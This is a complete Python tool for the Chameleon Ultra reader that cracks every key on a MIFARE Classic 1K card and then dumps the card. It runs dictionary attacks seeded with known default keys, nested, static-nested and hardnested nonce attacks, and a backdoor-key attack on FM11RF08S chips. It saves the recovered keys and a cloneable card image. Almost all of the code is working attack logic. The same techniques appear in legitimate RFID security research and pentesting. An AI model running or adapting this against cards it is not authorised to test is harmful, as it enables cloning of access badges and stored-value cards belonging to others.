#!/usr/bin/env python3
"""
Recover all MIFARE Classic 1K keys from a card on the Chameleon Ultra reader,
then dump the full card.

Strategy per sector:
    1. If <UID>-key.txt from a prior run is in the output directory, load
       its keys and skip work for sectors already cracked.
    2. Try every key in the dictionary (custom.txt) for both A and B.
    3. For sectors still unknown, run a nested attack using any key
       already recovered from another sector. Retried up to 3 times since
       nested key acquisition is probabilistic.

Outputs (next to this script's invocation cwd):
    <UID>-key.txt   human-readable per-sector key list
    <UID>-key.dic   one unique 12-hex key per line  [PM3/mfoc dictionary format]
    <UID>-key.bin   16 keyA (96 B) followed by 16 keyB (96 B)  [Proxmark3 format]
    <UID>-dump.bin  raw 1024-byte card image
    <UID>-dump.eml  same image, 16 hex bytes per line
"""

import argparse
import os
import re
import struct
import subprocess
import sys
import tempfile
import time
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parent
sys.path.insert(0, str(REPO_ROOT / "vendor/ChameleonUltra/script"))

import chameleon_cmd
import chameleon_com
import hardnested_utils
import serial.tools.list_ports

CHAMELEON_USB_VID = 0x6868

KEY_A = 0x60
KEY_B = 0x61
SECTOR_COUNT = 16          # MIFARE Classic 1K
BLOCKS_PER_SECTOR = 4
BIN_DIR = REPO_ROOT / "bin"


def first_block(sector: int) -> int:
    return sector * BLOCKS_PER_SECTOR


def trailer_block(sector: int) -> int:
    return sector * BLOCKS_PER_SECTOR + (BLOCKS_PER_SECTOR - 1)


def load_dictionary(path: Path) -> tuple[list[bytes], int, int]:
    """Returns (keys, n_from_file, n_defaults)."""
    keys: list[bytes] = []
    seen: set[bytes] = set()
    with path.open() as fh:
        for line in fh:
            line = line.strip()
            if not line or line.startswith("#"):
                continue
            if not re.fullmatch(r"[0-9a-fA-F]{12}", line):
                continue
            k = bytes.fromhex(line)
            if k not in seen:
                seen.add(k)
                keys.append(k)
    n_from_file = len(keys)
    # Always try the all-default keys too, cheap and high-yield.
    for default in (
        "FFFFFFFFFFFF", "A0A1A2A3A4A5", "D3F7D3F7D3F7", "000000000000",
        "B0B1B2B3B4B5", "4D3A99C351DD", "1A982C7E459A", "AABBCCDDEEFF",
    ):
        k = bytes.fromhex(default)
        if k not in seen:
            seen.add(k)
            keys.append(k)
    n_defaults = len(keys) - n_from_file
    return keys, n_from_file, n_defaults


def find_chameleon_port() -> str | None:
    """Return the device path of the first attached Chameleon, or None."""
    for p in serial.tools.list_ports.comports():
        if p.vid == CHAMELEON_USB_VID:
            return p.device
    return None


def auth(cmd: chameleon_cmd.ChameleonCMD, block: int, key_type: int, key: bytes) -> bool:
    try:
        return bool(cmd.mf1_auth_one_key_block(block, key_type, key))
    except Exception:
        return False


def load_existing_keys(path: Path, cmd, known) -> int:
    """If a previous-run keys file exists, verify each key still authenticates and
    populate `known`. Returns the number of keys loaded."""
    if not path.exists():
        return 0
    loaded = 0
    for line in path.read_text().splitlines():
        line = line.strip()
        if not line or line.startswith("#"):
            continue
        parts = line.split()
        if len(parts) < 3:
            continue
        try:
            sector = int(parts[0])
        except ValueError:
            continue
        if not 0 <= sector < SECTOR_COUNT:
            continue
        for kt_name, kt_val, hex_str in (("A", KEY_A, parts[1]), ("B", KEY_B, parts[2])):
            if not re.fullmatch(r"[0-9a-fA-F]{12}", hex_str):
                continue
            key = bytes.fromhex(hex_str)
            if auth(cmd, first_block(sector), kt_val, key):
                known[sector][kt_name] = key
                loaded += 1
    return loaded


def dictionary_attack(cmd, dictionary, known, save=None):
    """For each sector with an unknown A or B key, try every key in the dictionary."""
    for sector in range(SECTOR_COUNT):
        blk = first_block(sector)
        for kt_name, kt_val in (("A", KEY_A), ("B", KEY_B)):
            if known[sector][kt_name] is not None:
                continue
            print(f"  sector {sector:2d} key {kt_name}: trying {len(dictionary)} keys ... ",
                  end="", flush=True)
            found = None
            for key in dictionary:
                if auth(cmd, blk, kt_val, key):
                    found = key
                    break
            if found is not None:
                known[sector][kt_name] = found
                print(f"{found.hex().upper()}")
                if save:
                    save()
            else:
                print("none")


PRNG_STATIC = 0
PRNG_NESTED = 1
PRNG_HARD = 2

NESTED_RETRIES = 3
HARDNESTED_MAX_RUNS = 200
HARDNESTED_MAX_ATTEMPTS = 3
HARDNESTED_TIMEOUT_S = 1800

# Known FM11RF08S "static encrypted" backdoor keys (eprint.iacr.org/2024/1275).
# These authenticate every sector regardless of the real keys, used to acquire
# nonces that leak the actual keys via the senested cryptanalysis.
FM11RF08S_BACKDOOR_KEYS = [
    bytes.fromhex("A396EFA4E24F"),
    bytes.fromhex("A31667A8CEC1"),
    bytes.fromhex("518B3354E760"),
]
CHECK_KEYS_BATCH = 83  # firmware limit per mf1_check_keys_on_block call


def run_decryptor(name: str, cmd_args: list[str]) -> list[bytes]:
    """Invoke ./bin/<name> and return all 12-hex candidates from stdout."""
    proc = subprocess.run([str(BIN_DIR / name), *cmd_args],
                          cwd=str(BIN_DIR), capture_output=True, text=True, timeout=120)
    return [bytes.fromhex(m) for m in re.findall(r"([0-9a-fA-F]{12})", proc.stdout)]


def nested_recover(cmd, prng_type, src_block, src_type, src_key, tgt_block, tgt_type) -> bytes | None:
    """Acquire NT pairs from device, then run ./bin/(static)nested to crack the target."""
    if prng_type == PRNG_STATIC:
        nt_obj = cmd.mf1_static_nested_acquire(src_block, src_type, src_key, tgt_block, tgt_type)
        args = [f"{nt_obj['uid']}", str(tgt_type)]
        for nt in nt_obj["nts"]:
            args += [str(nt["nt"]), str(nt["nt_enc"])]
        candidates = run_decryptor("staticnested", args)
    else:
        dist = cmd.mf1_detect_nt_dist(src_block, src_type, src_key)
        nts = cmd.mf1_nested_acquire(src_block, src_type, src_key, tgt_block, tgt_type)
        args = [f"{dist['uid']}", str(dist["dist"])]
        for nt in nts:
            args += [str(nt["nt"]), str(nt["nt_enc"]), str(nt["par"])]
        candidates = run_decryptor("nested", args)
    for k in candidates:
        if auth(cmd, tgt_block, tgt_type, k):
            return k
    return None


def pick_source_key(known):
    for s in range(SECTOR_COUNT):
        for st_name, st_val in (("A", KEY_A), ("B", KEY_B)):
            if known[s][st_name] is not None:
                return first_block(s), st_val, known[s][st_name]
    return None


def detect_fm11rf08s(cmd) -> bytes | None:
    """Try known FM11RF08S backdoor keys against block 0. If one authenticates
    the card is FM11RF08S and we can use the senested attack. Backdoor keys
    only auth on this silicon, so the false-positive rate is essentially zero."""
    for key in FM11RF08S_BACKDOOR_KEYS:
        if auth(cmd, 0, KEY_A, key) or auth(cmd, 0, KEY_B, key):
            return key
    return None


def senested_phase(cmd, known, backdoor_key: bytes, out_dir: Path, save=None):
    """Recover keys via the FM11RF08S backdoor + 1nt static-encrypted attack
    (eprint.iacr.org/2024/1275). Acquires all 16 sectors' nonces in one shot,
    then per sector: staticnested_1nt for both A and B candidate dictionaries,
    staticnested_2x1nt_rf08s to cross-filter, test B candidates on the live
    card, and (if found) staticnested_2x1nt_rf08s_1key + B key to refine A.

    Note: untested without an FM11RF08S card on hand; faithful port of upstream
    senested logic. If you hit a real card and something misbehaves, that's
    where to look first.
    """
    print(f"  using backdoor {backdoor_key.hex().upper()}")
    try:
        acq = cmd.mf1_static_encrypted_nested_acquire(backdoor_key, SECTOR_COUNT, 0)
    except Exception as e:
        print(f"  acquire failed: {e}")
        return
    if not acq:
        print("  acquire returned no data")
        return

    uid_hex = format(acq["uid"], "08x")
    scratch = Path(tempfile.mkdtemp(prefix="rf08s_", dir=str(out_dir)))
    try:
        for sector in range(SECTOR_COUNT):
            if known[sector]["A"] is not None and known[sector]["B"] is not None:
                continue
            sector_str = f"{sector:02d}"
            nt_a = format(acq["nts"]["a"][sector]["nt"], "08x")
            nt_a_enc = format(acq["nts"]["a"][sector]["nt_enc"], "08x")
            par_a = str(acq["nts"]["a"][sector]["parity"]).zfill(4)
            nt_b = format(acq["nts"]["b"][sector]["nt"], "08x")
            nt_b_enc = format(acq["nts"]["b"][sector]["nt_enc"], "08x")
            par_b = str(acq["nts"]["b"][sector]["parity"]).zfill(4)
            trailer = sector * 4 + 3

            print(f"  sector {sector:2d}: generating candidate dictionaries...")
            subprocess.run([str(BIN_DIR / "staticnested_1nt"), uid_hex, sector_str,
                            nt_a, nt_a_enc, par_a],
                           cwd=str(scratch), capture_output=True, timeout=60)
            subprocess.run([str(BIN_DIR / "staticnested_1nt"), uid_hex, sector_str,
                            nt_b, nt_b_enc, par_b],
                           cwd=str(scratch), capture_output=True, timeout=60)
            a_dic = f"keys_{uid_hex}_{sector_str}_{nt_a}.dic"
            b_dic = f"keys_{uid_hex}_{sector_str}_{nt_b}.dic"
            subprocess.run([str(BIN_DIR / "staticnested_2x1nt_rf08s"), a_dic, b_dic],
                           cwd=str(scratch), capture_output=True, timeout=60)

            b_filtered = scratch / b_dic.replace(".dic", "_filtered.dic")
            if not b_filtered.exists():
                print(f"  sector {sector:2d}: filtering produced no B candidates")
                continue
            b_candidates = [bytes.fromhex(line.strip())
                            for line in b_filtered.read_text().splitlines()
                            if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]

            b_key = _check_keys_batched(cmd, trailer, KEY_B, b_candidates)
            if b_key is None:
                print(f"  sector {sector:2d}: B not in {len(b_candidates)} candidates")
                continue
            known[sector]["B"] = b_key
            print(f"  sector {sector:2d} key B: {b_key.hex().upper()}")
            if save:
                save()

            proc = subprocess.run(
                [str(BIN_DIR / "staticnested_2x1nt_rf08s_1key"),
                 nt_b, b_key.hex().upper(), a_dic],
                cwd=str(scratch), capture_output=True, text=True, timeout=60)
            a_fast = [bytes.fromhex(line.strip())
                      for line in proc.stdout.splitlines()
                      if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]
            a_key = _check_keys_batched(cmd, trailer, KEY_A, a_fast) if a_fast else None
            if a_key is None:
                a_filtered = scratch / a_dic.replace(".dic", "_filtered.dic")
                if a_filtered.exists():
                    a_candidates = [bytes.fromhex(line.strip())
                                    for line in a_filtered.read_text().splitlines()
                                    if re.fullmatch(r"[0-9a-fA-F]{12}", line.strip())]
                    print(f"  sector {sector:2d}: A fast path missed; "
                          f"checking {len(a_candidates)} filtered A candidates...")
                    a_key = _check_keys_batched(cmd, trailer, KEY_A, a_candidates)
            if a_key is None:
                print(f"  sector {sector:2d}: A not recoverable from candidates")
                continue
            known[sector]["A"] = a_key
            print(f"  sector {sector:2d} key A: {a_key.hex().upper()}")
            if save:
                save()
    finally:
        for p in scratch.glob("*"):
            try:
                p.unlink()
            except OSError:
                pass
        try:
            scratch.rmdir()
        except OSError:
            pass


def _check_keys_batched(cmd, block: int, key_type: int, keys: list[bytes]) -> bytes | None:
    """Try `keys` against the live card via mf1_check_keys_on_block (~33 keys/s),
    in batches of CHECK_KEYS_BATCH. Returns the first match or None."""
    for i in range(0, len(keys), CHECK_KEYS_BATCH):
        batch = keys[i:i + CHECK_KEYS_BATCH]
        if not batch:
            continue
        try:
            found = cmd.mf1_check_keys_on_block(block, key_type, batch)
        except Exception:
            continue
        if found:
            return bytes(found)
    return None


def hardnested_phase(cmd, known, uid_bytes, out_dir: Path, save=None):
    """For each still-unknown sector key, run hardnested using any known key as source."""
    for sector in range(SECTOR_COUNT):
        for kt_name, kt_val in (("A", KEY_A), ("B", KEY_B)):
            if known[sector][kt_name] is not None:
                continue
            src = pick_source_key(known)
            if src is None:
                print("  no known key available, cannot run hardnested")
                return
            src_block, src_type, src_key = src
            tgt_block = first_block(sector)
            print(f"  sector {sector:2d} key {kt_name}: hardnested from blk {src_block}")
            k = hardnested_recover(cmd, uid_bytes, src_block, src_type, src_key,
                                   tgt_block, kt_val, out_dir)
            if k is None:
                print(f"  sector {sector:2d} key {kt_name}: FAILED")
            else:
                known[sector][kt_name] = k
                print(f"  sector {sector:2d} key {kt_name}: {k.hex().upper()}")
                if save:
                    save()


def hardnested_recover(cmd, uid_bytes, src_block, src_type, src_key,
                       tgt_block, tgt_type, out_dir: Path) -> bytes | None:
    """Recover a key via hardnested. Acquires nonces from the firmware until 256
    unique nt_enc MSBs have been seen with a parity sum in the known-valid set,
    writes the binary nonce file expected by ./bin/hardnested, runs the cracker,
    and verifies the candidate key against the live card. Returns the key bytes
    or None.

    Nonce files persist on disk as <UID>-hardnested-blk<N>-<A|B>.nonces.bin so
    a re-run can skip acquisition if the prior nonces are still on disk.
    Acquisition is the expensive RF phase; cracking is the expensive CPU phase.
    Either being already done lets a re-run skip it.
    """
    if len(uid_bytes) == 4:
        uid_for_file = uid_bytes
    elif len(uid_bytes) == 7:
        uid_for_file = uid_bytes[3:7]
    elif len(uid_bytes) == 10:
        uid_for_file = uid_bytes[6:10]
    else:
        print(f"      unexpected UID length {len(uid_bytes)}")
        return None

    type_target_bit = 0 if tgt_type == KEY_A else 1
    header = uid_for_file + bytes([tgt_block, type_target_bit])

    type_letter = "A" if tgt_type == KEY_A else "B"
    nonce_file = out_dir / (
        f"{uid_bytes.hex().lower()}-hardnested-blk{tgt_block:02d}-{type_letter}.nonces.bin"
    )

    if nonce_file.exists() and nonce_file.stat().st_size > len(header):
        print(f"      reusing nonces from {nonce_file.name}")
    else:
        out_dir.mkdir(parents=True, exist_ok=True)
        if not _acquire_hardnested_nonces(cmd, src_block, src_type, src_key,
                                          tgt_block, tgt_type, header, nonce_file):
            return None

    print(f"      cracking ({(nonce_file.stat().st_size - len(header)) // 9} nonces) ... ",
          end="", flush=True)
    t0 = time.time()
    proc = subprocess.run([str(BIN_DIR / "hardnested"), str(nonce_file)],
                          capture_output=True, text=True,
                          timeout=HARDNESTED_TIMEOUT_S)
    print(f"done in {int(time.time() - t0)}s")
    for line in proc.stdout.splitlines():
        line = line.strip()
        if line.startswith("Key found:"):
            m = re.search(r"([a-fA-F0-9]{12})", line[len("Key found:"):])
            if m:
                cand = bytes.fromhex(m.group(1))
                if auth(cmd, tgt_block, tgt_type, cand):
                    nonce_file.unlink(missing_ok=True)
                    return cand
    return None


def _acquire_hardnested_nonces(cmd, src_block, src_type, src_key,
                               tgt_block, tgt_type, header, nonce_file: Path) -> bool:
    """Inner loop: acquire nonces and write them to nonce_file. Returns True on
    success (256 MSBs seen with a valid parity sum)."""
    for attempt in range(1, HARDNESTED_MAX_ATTEMPTS + 1):
        raw_total = bytearray()
        seen_msbs = [False] * 256
        unique_count = 0
        parity_sum = 0

        for run in range(1, HARDNESTED_MAX_RUNS + 1):
            try:
                raw = cmd.mf1_hard_nested_acquire(False, src_block, src_type, src_key,
                                                  tgt_block, tgt_type)
            except Exception as e:
                print(f"\n      acquire error on run {run}: {e}")
                break
            if not raw:
                continue
            raw_total.extend(raw)

            for i in range(len(raw) // 9):
                _, nt_enc, par = struct.unpack_from("!IIB", raw, i * 9)
                msb = (nt_enc >> 24) & 0xFF
                if not seen_msbs[msb]:
                    seen_msbs[msb] = True
                    unique_count += 1
                    parity_sum += hardnested_utils.evenparity32(
                        (nt_enc & 0xFF000000) | (par & 0x08))

            print(f"\r      attempt {attempt}/{HARDNESTED_MAX_ATTEMPTS}: "
                  f"{unique_count}/256 MSBs (sum={parity_sum})    ",
                  end="", flush=True)

            if unique_count == 256:
                if parity_sum in hardnested_utils.hardnested_sums:
                    print(" valid")
                    nonce_file.write_bytes(header + bytes(raw_total))
                    return True
                print(f" INVALID (need one of {hardnested_utils.hardnested_sums}); restarting")
                break
    return False


def nested_attack(cmd, known, uid_bytes, out_dir: Path, save=None):
    """Walk every still-unknown sector key and try nested/hardnested using any known key."""
    try:
        prng_type = cmd.mf1_detect_prng()
    except Exception as e:
        print(f"  PRNG detection failed: {e}")
        return
    label = {PRNG_STATIC: "staticnested", PRNG_NESTED: "nested", PRNG_HARD: "hardnested"}.get(
        prng_type, f"unknown({prng_type})")
    print(f"  PRNG class: {label}")
    if prng_type == PRNG_HARD:
        hardnested_phase(cmd, known, uid_bytes, out_dir, save=save)
        return

    for sector in range(SECTOR_COUNT):
        for kt_name, kt_val in (("A", KEY_A), ("B", KEY_B)):
            if known[sector][kt_name] is not None:
                continue
            src = pick_source_key(known)
            if src is None:
                print("  no known key available, cannot run nested")
                return
            src_block, src_type, src_key = src
            tgt_block = first_block(sector)
            print(f"  sector {sector:2d} key {kt_name}: ", end="", flush=True)
            for attempt in range(1, NESTED_RETRIES + 1):
                try:
                    k = nested_recover(cmd, prng_type, src_block, src_type, src_key,
                                       tgt_block, kt_val)
                except Exception as e:
                    print(f"error: {e}", end=" ")
                    k = None
                if k is not None:
                    known[sector][kt_name] = k
                    print(k.hex().upper())
                    if save:
                        save()
                    break
                if attempt < NESTED_RETRIES:
                    print(f"retry {attempt}... ", end="", flush=True)
            else:
                print("FAILED")


def read_card(cmd, known) -> bytearray:
    """Read all 64 blocks. Sector trailers come from key bytes we already have."""
    data = bytearray(64 * 16)
    for sector in range(SECTOR_COUNT):
        ka = known[sector]["A"]
        kb = known[sector]["B"]
        # Pick whichever side authed; for trailer block we must compose ourselves
        # since reading the trailer with key A often returns zeros for keyA.
        for i in range(BLOCKS_PER_SECTOR):
            blk = first_block(sector) + i
            block_data = None
            if i == BLOCKS_PER_SECTOR - 1:
                # trailer: synthesise from known keys + default access bits if we can,
                # but prefer reading with key B which does return both halves on most cards
                if kb is not None:
                    try:
                        block_data = bytes(cmd.mf1_read_one_block(blk, KEY_B, kb))
                    except Exception:
                        block_data = None
            if block_data is None:
                for kt_val, key in ((KEY_A, ka), (KEY_B, kb)):
                    if key is None:
                        continue
                    try:
                        block_data = bytes(cmd.mf1_read_one_block(blk, kt_val, key))
                        break
                    except Exception:
                        continue
            if block_data is None:
                print(f"  blk {blk:2d}: UNREADABLE")
                continue
            # Patch the trailer's key bytes from what we know (most readers return
            # zeros for the key A field even when we authed successfully).
            if i == BLOCKS_PER_SECTOR - 1:
                patched = bytearray(block_data)
                if ka is not None:
                    patched[0:6] = ka
                if kb is not None:
                    patched[10:16] = kb
                block_data = bytes(patched)
            data[blk * 16:(blk + 1) * 16] = block_data
    return data


def save_keys(uid_hex: str, known, out_dir: Path):
    """Persist the current keys to txt/dic/bin. Safe to call after every find;
    keeps progress on disk so a crash mid-attack doesn't lose hours of work."""
    out_dir.mkdir(parents=True, exist_ok=True)
    txt = out_dir / f"{uid_hex}-key.txt"
    dic = out_dir / f"{uid_hex}-key.dic"
    binkey = out_dir / f"{uid_hex}-key.bin"

    with txt.open("w") as fh:
        fh.write(f"# UID {uid_hex}\n# sector  keyA          keyB\n")
        for s in range(SECTOR_COUNT):
            a = known[s]["A"].hex().upper() if known[s]["A"] else "------------"
            b = known[s]["B"].hex().upper() if known[s]["B"] else "------------"
            fh.write(f"{s:7d}  {a}  {b}\n")

    unique_keys = []
    seen = set()
    for s in range(SECTOR_COUNT):
        for kt in ("A", "B"):
            k = known[s][kt]
            if k is not None and k not in seen:
                seen.add(k)
                unique_keys.append(k)
    with dic.open("w") as fh:
        fh.write(f"# UID {uid_hex} ({len(unique_keys)} unique keys)\n")
        for k in unique_keys:
            fh.write(k.hex().upper() + "\n")

    with binkey.open("wb") as fh:
        for s in range(SECTOR_COUNT):
            fh.write(known[s]["A"] if known[s]["A"] else b"\x00" * 6)
        for s in range(SECTOR_COUNT):
            fh.write(known[s]["B"] if known[s]["B"] else b"\x00" * 6)


def write_outputs(uid_hex: str, known, dump: bytes, out_dir: Path):
    save_keys(uid_hex, known, out_dir)
    bindump = out_dir / f"{uid_hex}-dump.bin"
    eml = out_dir / f"{uid_hex}-dump.eml"
    bindump.write_bytes(dump)
    with eml.open("w") as fh:
        for i in range(0, len(dump), 16):
            fh.write(dump[i:i + 16].hex() + "\n")
    print(f"\nWrote: {uid_hex}-key.{{txt,dic,bin}}, {uid_hex}-dump.{{bin,eml}}")


def main():
    ap = argparse.ArgumentParser(description=__doc__)
    ap.add_argument("-p", "--port", default=None,
                    help="serial port (auto-detected by USB VID if omitted)")
    ap.add_argument("-d", "--dict", default=str(REPO_ROOT / "dict.txt"))
    ap.add_argument("-o", "--out", default=".", help="output directory")
    args = ap.parse_args()

    dictionary, n_file, n_defaults = load_dictionary(Path(args.dict))
    print(f"Loaded {n_file} keys from {args.dict} + {n_defaults} well-known defaults"
          f" = {len(dictionary)} total")

    port = args.port or find_chameleon_port()
    if port is None:
        print("No Chameleon device found on USB. Plug it in or specify --port.")
        sys.exit(1)
    print(f"Connecting to {port}")
    com = chameleon_com.ChameleonCom()
    com.open(port)
    cmd = chameleon_cmd.ChameleonCMD(com)

    if not cmd.is_device_reader_mode():
        print("Switching to reader mode...")
        cmd.set_device_reader_mode(True)
        time.sleep(0.3)

    scan = cmd.hf14a_scan()
    if not scan:
        print("No card detected on the reader.")
        com.close()
        sys.exit(1)
    tag = scan[0]
    uid_bytes = tag["uid"]
    uid_hex = uid_bytes.hex().upper()
    uid_int_hex = f"{int.from_bytes(uid_bytes, 'big'):08x}"
    print(f"Card UID  : {uid_hex}")
    print(f"     ATQA : {tag['atqa'].hex().upper()}  SAK: {tag['sak'].hex().upper()}")

    # known[sector][key_type] = bytes or None
    known = [{"A": None, "B": None} for _ in range(SECTOR_COUNT)]

    out_dir = Path(args.out)
    prev_keys = out_dir / f"{uid_int_hex}-key.txt"
    print(f"\n[0/3] Loading prior keys from {prev_keys} (if any)...")
    loaded = load_existing_keys(prev_keys, cmd, known)
    if loaded:
        print(f"  resumed {loaded}/{SECTOR_COUNT * 2} keys from previous run")
    else:
        print("  none")

    save = lambda: save_keys(uid_int_hex, known, out_dir)

    if any(s[kt] is None for s in known for kt in ("A", "B")):
        backdoor = detect_fm11rf08s(cmd)
        if backdoor is not None:
            print(f"\nFM11RF08S detected (backdoor {backdoor.hex().upper()}). Running senested:")
            senested_phase(cmd, known, backdoor, out_dir, save=save)

    print("\n[1/3] Dictionary attack...")
    dictionary_attack(cmd, dictionary, known, save=save)

    missing = sum(1 for s in known for kt in ("A", "B") if s[kt] is None)
    if missing:
        print(f"\n[2/3] Nested attack ({missing} keys still missing)...")
        nested_attack(cmd, known, uid_bytes, out_dir, save=save)
    else:
        print("\n[2/3] All keys found via dictionary, skipping nested.")

    print("\n[3/3] Reading all blocks...")
    dump = read_card(cmd, known)

    write_outputs(uid_int_hex, known, dump, out_dir)
    com.close()


if __name__ == "__main__":
    main()
